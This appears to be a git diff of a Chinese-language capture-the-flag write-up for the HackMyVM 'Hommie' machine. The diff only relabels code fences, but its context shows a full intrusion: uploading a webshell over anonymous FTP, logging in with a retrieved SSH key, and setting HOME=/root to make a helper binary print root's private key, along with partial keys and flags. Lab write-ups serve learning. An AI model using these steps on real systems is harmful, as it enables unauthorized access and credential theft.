@@ -71,7 +71,7 @@ Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
 
 ## 访问 web 服务
 
-```shell
+```bash
 ┌─[randark@randark-Parrot]─[~/tmp/HackMyVM-Hommie]
 └──╼ $http get 192.168.56.105
 HTTP/1.1 200 OK
@@ -100,7 +100,7 @@ nobody
 
 ftp 服务允许匿名访问
 
-```shell
+```bash
 ┌─[randark@randark-Parrot]─[~/tmp/HackMyVM-Hommie]
 └──╼ $ftp 192.168.56.105
 Connected to 192.168.56.105.
@@ -116,7 +116,7 @@ ftp>
 
 列出所有目录和文件
 
-```shell
+```bash
 ftp> ls -lah
 200 PORT command successful. Consider using PASV.
 150 Here comes the directory listing.
@@ -129,7 +129,7 @@ drwxrwxr-x    2 0        113          4096 Sep 30  2020 .web
 
 查看 `.web` 目录
 
-```shell
+```bash
 ftp> cd .web
 250 Directory successfully changed.
 ftp> ls -lah
@@ -143,7 +143,7 @@ drwxr-xr-x    3 0        113          4096 Sep 30  2020 ..
 
 并且可以上传 webshell
 
-```shell
+```bash
 ftp> put webshell.php
 local: webshell.php remote: webshell.php
 200 PORT command successful. Consider using PASV.
@@ -162,7 +162,7 @@ drwxr-xr-x    3 0        113          4096 Sep 30  2020 ..
 
 尝试访问 webshell
 
-```shell
+```bash
 ┌─[randark@randark-Parrot]─[~/tmp/HackMyVM-Hommie]
 └──╼ $http get 192.168.56.105/webshell.php
 HTTP/1.1 200 OK
@@ -193,7 +193,7 @@ Received 1850 bytes in 0.0 seconds
 
 利用私钥登录 SSH
 
-```shell
+```bash
 ┌─[randark@randark-Parrot]─[~/tmp/HackMyVM-Hommie]
 └──╼ $ssh alexia@192.168.56.105 -i id_rsa
 Linux hommie 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64
@@ -211,7 +211,7 @@ alexia
 
 ## user pwned
 
-```shell
+```bash
 alexia@hommie:~$ cat user.txt
 Imnotroot
 ```
@@ -239,7 +239,7 @@ Imnotroot
 
 尝试直接运行
 
-```shell
+```bash
 alexia@hommie:~$ /opt/showMetheKey
 -----BEGIN OPENSSH PRIVATE KEY-----
 b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
@@ -282,7 +282,7 @@ system("cat $HOME/.ssh/id_rsa");
 
 那么就可以通过控制 `$HOME` 环境变量，来让 `/opt/showMetheKey` 读取 root 账户的 SSH 私钥
 
-```shell
+```bash
 alexia@hommie:/home/alexia$ export HOME=/root
 alexia@hommie:/home/alexia$ /opt/showMetheKey
 -----BEGIN OPENSSH PRIVATE KEY-----
@@ -316,7 +316,7 @@ gmxzbd40GES6DWsAAAALcm9vdEBob21taWU=
 
 保存 SSH 私钥到本地，然后尝试登录 root 账户
 
-```shell
+```bash
 ┌─[randark@randark-Parrot]─[~/tmp/HackMyVM-Hommie]
 └──╼ $ssh root@192.168.56.105 -i id_rsa_root
 Linux hommie 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64
@@ -342,14 +342,14 @@ I dont remember where I stored root.txt !!!
 
 尝试全盘搜索文件
 
-```shell
+```bash
 root@hommie:/# find / -name "root.txt" 2>/dev/null
 /usr/include/root.txt
 ```
 
 ## root pwned
 
-```shell
+```bash
 root@hommie:/# cat /usr/include/root.txt
 Imnotbatman
 ```
